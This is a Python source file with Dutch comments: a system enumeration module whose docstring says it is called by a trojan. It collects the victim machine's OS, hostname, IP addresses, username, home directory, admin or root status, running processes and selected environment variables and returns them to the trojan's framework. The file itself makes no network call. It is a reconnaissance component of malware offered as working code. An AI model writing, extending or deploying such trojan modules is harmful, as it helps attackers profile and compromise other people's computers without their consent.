"""
System Enumeration Module
Verzamelt informatie over het systeem: OS, hardware, gebruikers, processen
"""

import os
import platform
import socket
import getpass
from datetime import datetime

def run(params):
    """
    Hoofdfunctie die wordt aangeroepen door de trojan
    params: dict met configuratie opties
    """
    resultaat = {
        "module": "system_enum",
        "timestamp": datetime.now().isoformat(),
        "data": {}
    }
    
    # Basis systeem info
    resultaat["data"]["systeem"] = verzamel_systeem_info()
    
    # Netwerk info
    resultaat["data"]["netwerk"] = verzamel_netwerk_info()
    
    # Gebruiker info
    resultaat["data"]["gebruiker"] = verzamel_gebruiker_info()
    
    # Uitgebreide info als param gezet
    if params.get("uitgebreid", False):
        resultaat["data"]["processen"] = verzamel_proces_info()
        resultaat["data"]["environment"] = verzamel_env_vars()
    
    return resultaat


def verzamel_systeem_info():
    """Verzamel basis systeem informatie"""
    info = {
        "os": platform.system(),
        "os_versie": platform.version(),
        "os_release": platform.release(),
        "architectuur": platform.machine(),
        "processor": platform.processor(),
        "hostname": socket.gethostname(),
        "python_versie": platform.python_version()
    }
    
    # Windows specifieke info
    if platform.system() == "Windows":
        try:
            info["windows_editie"] = platform.win32_edition()
        except:
            pass
    
    return info


def verzamel_netwerk_info():
    """Verzamel netwerk informatie"""
    info = {
        "hostname": socket.gethostname(),
        "ip_adressen": []
    }
    
    try:
        # Haal alle IP adressen op
        hostname = socket.gethostname()
        info["lokaal_ip"] = socket.gethostbyname(hostname)
        
        # Probeer alle IPs te krijgen
        try:
            alle_ips = socket.getaddrinfo(hostname, None)
            for ip_info in alle_ips:
                ip = ip_info[4][0]
                if ip not in info["ip_adressen"]:
                    info["ip_adressen"].append(ip)
        except:
            pass
            
    except Exception as e:
        info["fout"] = str(e)
    
    return info


def verzamel_gebruiker_info():
    """Verzamel info over de huidige gebruiker"""
    info = {
        "username": getpass.getuser(),
        "home_dir": os.path.expanduser("~"),
        "cwd": os.getcwd()
    }
    
    # Check admin rechten op Windows
    if platform.system() == "Windows":
        try:
            import ctypes
            info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            info["is_admin"] = "onbekend"
    else:
        info["is_root"] = os.geteuid() == 0 if hasattr(os, 'geteuid') else "onbekend"
    
    return info


def verzamel_proces_info():
    """Verzamel info over draaiende processen"""
    processen = []
    
    try:
        # Probeer psutil te gebruiken als beschikbaar
        import psutil
        
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                proces_info = proc.info
                processen.append({
                    "pid": proces_info['pid'],
                    "naam": proces_info['name'],
                    "gebruiker": proces_info['username']
                })
            except:
                continue
                
        # Limiteer tot eerste 50 processen
        processen = processen[:50]
        
    except ImportError:
        # Fallback zonder psutil
        if platform.system() == "Windows":
            try:
                import subprocess
                output = subprocess.check_output("tasklist", shell=True).decode()
                lines = output.strip().split('\n')[3:]  # Skip headers
                for line in lines[:30]:
                    parts = line.split()
                    if len(parts) >= 2:
                        processen.append({
                            "naam": parts[0],
                            "pid": parts[1]
                        })
            except:
                processen = [{"info": "Kon processen niet ophalen"}]
        else:
            processen = [{"info": "psutil niet geinstalleerd"}]
    
    return processen


def verzamel_env_vars():
    """Verzamel interessante environment variabelen"""
    interessante_vars = [
        "PATH", "USERNAME", "COMPUTERNAME", "USERDOMAIN",
        "PROCESSOR_ARCHITECTURE", "TEMP", "APPDATA",
        "PROGRAMFILES", "SYSTEMROOT"
    ]
    
    env_data = {}
    for var in interessante_vars:
        waarde = os.environ.get(var)
        if waarde:
            env_data[var] = waarde
    
    return env_data
